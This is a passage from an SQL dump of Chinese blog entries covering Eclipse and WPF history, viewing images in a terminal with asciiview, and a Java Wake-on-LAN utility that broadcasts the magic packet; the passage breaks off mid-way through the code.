Developer作为服务器应用程序的开发平台。两个平台的不兼容性孕育出了一个旷古奇葩Eclipse，现在IBM的几个生产线都是基于Eclipse的：Rational系列，Websphere系列，甚至古老的主机的CICS也有基于Eclipse的管理程序。不过IBM用的是内部的Eclipse版本，需要License的；而我们用的Eclipse是社区版的。秦始皇统一了度量衡，SOA统一了分布系统调用方式，Eclipse统一了IBM的开发平台。<br /><br />再看WPF，第一次看到WPF，感觉这是一个很漂亮得想法，用xml来写界面。近几天用WPF得ListView进行数据绑定，写着写着突然发现这个和Asp.Net得数据绑定如出一辙，再想到WPF Application与WPF Browser Application，微软将应用程序与浏览器应用程序统一了起来。<br /><br />三流的企业做产品，二流的企业做规模，一流的企业做标准。标准是什么？标准就是统一的规则。<br />',1,1,1,0,0,0,'Eclipse的产生有一个故事，传说很早很早以前，IBM使用VisuralAge for Java作为swt等的开发平台，Websphere Application Server Developer作为服务器应用程序的开发平台。两个平台的不兼容性孕育出了一个旷古奇葩Eclipse，现在IBM的几个生产线都是基于Eclipse的：Rational系列，Websphere系列，甚至古老的主机的CICS也有基于Eclipse的管理程序。不过IBM用的是内部的Eclipse版本，需要License的；而我们用的Eclipse是社区版的。秦始皇统一了度量衡，SOA统一了分布系统调用方式，Eclipse统一了IBM的开发平台。再看WPF，第一次看到WPF，感觉这是一个很漂亮得想法，用xml来写界面。近几天用WPF得ListView进行数据绑定，写着写着突然发现这个和Asp.Net得数据绑定如出一辙，再想到WPF Application与WPF Browser Application，微软将应用程序与浏览器应用程序统一了起来。三流的企业做产品，二流的企业做规模，一流的企业做标准。标准是什么？标准就是统一的规则。','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(367,'在命令行下查看图片','3373193720095582126669',2,'2009-06-05 20:21:26',NULL,'2009-06-05 20:21:26','2014-07-13 18:57:26','有一句话说：<br />Windows可以做的，Linux可以做；<br />有些Windows不可以做的，Linux也可以做；<br />有些Windows不可以做的，Linux也不可以做的，那是因为不值得做。<br />在命令行下看图片，貌似Windows下是不可以做的，一直一位Linux下应该可以做，因为太沉迷putty了，今天终于发现了，确实可以的， asciiview, 而且效果相当好，简直可以用来破解139邮箱的验证码了<br />sudo apt-get install asciiview<br />asciiview a.gif<br />看清除了，验证码是2CPI<br /><a href=\"/static/163/5707749577739207079.jpg\" target=\"_blank\"><img alt=\"在命令行下查看图片 - hankjin - 乱-Blog\" src=\"/static/163/5707749577739207079.jpg\" title=\"在命令行下查看图片 - hankjin - 乱-Blog\" /></a><br /><br />',1,1,1,0,0,0,'有一句话说：Windows可以做的，Linux可以做；有些Windows不可以做的，Linux也可以做；有些Windows不可以做的，Linux也不可以做的，那是因为不值得做。在命令行下看图片，貌似Windows下是不可以做的，一直一位Linux下应该可以做，因为太沉迷putty了，今天终于发现了，确实可以的， asciiview, 而且效果相当好，简直可以用来破解139邮箱的验证码了sudo apt-get install asciiviewasciiview a.gif看清除了，验证码是2CPI','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(368,'网络唤醒网络开机','3373193720093882025878',2,'2009-04-08 20:20:25',NULL,'2009-04-08 20:20:25','2014-07-13 18:57:26','首先要知道目标机的Mac地址, 然后将目标机的网络启动功能从BIOS里启动, <br />构造一个102位的UDP包,6个FF+16*6个MAC地址, 然后广播出去255.255.255.255. 然后就万事大吉了!<br />public class WOL4j {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static byte[] parseMac(String mac) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = mac.trim();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (mac.length() != 12 &amp;&amp; mac.length() != 17) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(\"invalid mac address\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = mac.replaceAll(\":\", \"\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = mac.replaceAll(\"-\", \"\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!mac.matches(\"\\\\p{XDigit}{12}\")) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(\"invalid mac address\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] macBytes = Tools.StrToHex(mac);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return macBytes;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static DatagramPacket createPacket(String mac, String ip) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // check mac address<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] destMac = parseMac(mac);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (destMac == null)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // check ip address<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String destIP = \"255.255.255.255\";<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!ip.equals(\"\"))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; destIP = ip;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InetAddress destHost = null;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; destHost = InetAddress.getByName(destIP);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (UnknownHostException e) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // construct packet data<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] magicBytes = new byte[102];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 6; i++)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; magicBytes[i] = (byte) 0xFF;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 16; i++) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int j = 0; j &lt; destMac.length; j++) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; magicBytes[6 + destMac.length * i + j] = destMac[j];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // create packet<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DatagramPacket dp = null;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dp = new DatagramPacket(magicBytes, magicBytes.length, destHost, 10000);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return dp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static void sendPacket(DatagramPacket dp) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DatagramSocket ds = new DatagramSocket();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.send(dp);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (SocketException e) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (IOException ie) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ie.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static int sendWakeUpMessage(String mac, String ip) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DatagramPacket dp = WOL4j.createPacket(mac, ip);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (dp != null) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WOL4j.sendPacket(dp);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0; // success<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1; // fail<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String mac = \"\", ip = \"\";<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (args.length) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 0:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = \"00-E0-4C-42-2B-AC\";<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 8:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(\"Usage: WakeOnLan mac [ip]\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(\"&nbsp;&nbsp;&nbsp; mac format: 0005DA... or Seperated with \'-\' or \':\' \");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 1:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = args[0];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 2:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 2:<br />